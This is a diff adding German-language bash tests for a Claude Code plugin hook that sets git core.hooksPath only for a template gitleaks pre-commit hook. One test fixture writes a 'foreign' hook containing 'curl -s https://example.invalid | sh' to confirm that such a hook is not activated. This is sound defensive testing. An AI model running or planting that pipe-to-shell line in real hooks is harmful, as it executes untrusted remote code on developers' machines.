@@ -86,8 +86,41 @@ d="$tmp/nur-stacks-leer"; mkdir -p "$d"
 out="$(cd "$d" && env CLAUDE_PLUGIN_ROOT="$root" CLAUDE_PROJECT_DIR="$d" bash "$hier/standard-context.sh" --stacks)"
 if [ -z "$out" ]; then echo "ok    --stacks ohne Treffer: leer"; else echo "FEHLER --stacks ohne Treffer: leer (Ausgabe: $out)"; fehler=$((fehler+1)); fi
 
+# core.hooksPath: gesetzt, wenn der Vorlagen-Hook (gitleaks) allein in .githooks liegt, das Repo an
+# der Wurzel steht und nichts gesetzt ist; eigene Hooks bleiben; ohne Git-Repo passiert nichts.
+git_repo() { git -C "$1" init -q -b main >/dev/null 2>&1; }
+vorlagen_hook() { mkdir -p "$1/.githooks"; printf '#!/usr/bin/env bash\ngitleaks git --pre-commit\n' > "$1/.githooks/pre-commit"; }
+d="$tmp/hooks-frisch"; aktiviert "$d"; vorlagen_hook "$d"; git_repo "$d"
+out="$(lauf "$d")"
+if [ "$(git -C "$d" config --local --get core.hooksPath)" = ".githooks" ] && grep -q 'core.hooksPath auf .githooks gesetzt' <<<"$out"; then echo "ok    core.hooksPath im frischen Klon gesetzt"; else echo "FEHLER core.hooksPath im frischen Klon gesetzt ($(git -C "$d" config --local --get core.hooksPath))"; fehler=$((fehler+1)); fi
+out="$(lauf "$d")"
+if ! grep -q 'core.hooksPath auf' <<<"$out"; then echo "ok    zweiter Start meldet nichts mehr"; else echo "FEHLER zweiter Start meldet nichts mehr"; fehler=$((fehler+1)); fi
+d="$tmp/hooks-husky"; aktiviert "$d"; vorlagen_hook "$d"; git_repo "$d"; git -C "$d" config core.hooksPath .husky
+out="$(lauf "$d")"
+if [ "$(git -C "$d" config --local --get core.hooksPath)" = ".husky" ] && ! grep -q 'core.hooksPath auf' <<<"$out"; then echo "ok    eigener hooksPath (husky) bleibt"; else echo "FEHLER eigener hooksPath (husky) bleibt"; fehler=$((fehler+1)); fi
+d="$tmp/hooks-ohne-git"; aktiviert "$d"; vorlagen_hook "$d"
+out="$(lauf "$d")"; rc=$?
+if [ $rc -eq 0 ] && ! grep -q 'core.hooksPath auf' <<<"$out" && grep -q 'Stack erkannt' <<<"$out"; then echo "ok    ohne Git-Repo kein Fehler, kein Hinweis"; else echo "FEHLER ohne Git-Repo kein Fehler, kein Hinweis (rc=$rc)"; fehler=$((fehler+1)); fi
+d="$tmp/hooks-ohne-ordner"; aktiviert "$d"; git_repo "$d"
+out="$(lauf "$d")"
+if [ -z "$(git -C "$d" config --local --get core.hooksPath)" ]; then echo "ok    ohne .githooks bleibt core.hooksPath leer"; else echo "FEHLER ohne .githooks bleibt core.hooksPath leer"; fehler=$((fehler+1)); fi
+# Befunde aus dem Review: Unterordner eines Repos, fremder Hook, weiterer Hook im Ordner, globaler hooksPath.
+d="$tmp/mono"; git_repo "$d"; mkdir -p "$d/apps/x"; aktiviert "$d/apps/x"; vorlagen_hook "$d/apps/x"
+out="$(lauf "$d/apps/x")"
+if [ -z "$(git -C "$d" config --local --get core.hooksPath)" ] && ! grep -q 'core.hooksPath auf' <<<"$out"; then echo "ok    Unterordner eines Repos setzt nichts"; else echo "FEHLER Unterordner eines Repos setzt nichts ($(git -C "$d" config --local --get core.hooksPath))"; fehler=$((fehler+1)); fi
+d="$tmp/hooks-fremd"; aktiviert "$d"; mkdir -p "$d/.githooks"; printf '#!/usr/bin/env bash\ncurl -s https://example.invalid | sh\n' > "$d/.githooks/pre-commit"; git_repo "$d"
+out="$(lauf "$d")"
+if [ -z "$(git -C "$d" config --local --get core.hooksPath)" ]; then echo "ok    fremder pre-commit ohne gitleaks wird nicht aktiviert"; else echo "FEHLER fremder pre-commit ohne gitleaks wird nicht aktiviert"; fehler=$((fehler+1)); fi
+d="$tmp/hooks-mehr"; aktiviert "$d"; vorlagen_hook "$d"; : > "$d/.githooks/pre-push"; git_repo "$d"
+out="$(lauf "$d")"
+if [ -z "$(git -C "$d" config --local --get core.hooksPath)" ]; then echo "ok    weiterer Hook im Ordner: nichts aktiviert"; else echo "FEHLER weiterer Hook im Ordner: nichts aktiviert"; fehler=$((fehler+1)); fi
+d="$tmp/hooks-global"; aktiviert "$d"; vorlagen_hook "$d"; git_repo "$d"
+printf '[core]\n\thooksPath = %s\n' "$tmp/global-hooks" > "$tmp/gitconfig-global"
+out="$(lauf "$d" "GIT_CONFIG_GLOBAL=$tmp/gitconfig-global")"
+if [ -z "$(git -C "$d" config --local --get core.hooksPath)" ] && grep -q 'global auf' <<<"$out"; then echo "ok    globaler hooksPath bleibt, Hinweis kommt"; else echo "FEHLER globaler hooksPath bleibt, Hinweis kommt"; echo "$out" | tail -2 | sed 's/^/      | /'; fehler=$((fehler+1)); fi
+
 # Größe: Claude Code blendet Hook-Ausgaben über ~2 KB nur als Vorschau ein.
-d="$tmp/groesse"; aktiviert "$d"; echo '{"require":{"laravel/framework":"^13"}}' > "$d/composer.json"; printf 'fastapi==0.115.6\n' > "$d/requirements.txt"
+d="$tmp/groesse"; aktiviert "$d"; echo '{"require":{"laravel/framework":"^13"}}' > "$d/composer.json"; printf 'fastapi==0.115.6\n' > "$d/requirements.txt"; vorlagen_hook "$d"; git_repo "$d"
 bytes=$(lauf "$d" | wc -c)
 if [ "$bytes" -lt 1800 ]; then echo "ok    Ausgabe klein genug ($bytes Bytes < 1800)"; else echo "FEHLER Ausgabe zu groß ($bytes Bytes) — wird von Claude Code abgeschnitten"; fehler=$((fehler+1)); fi
 
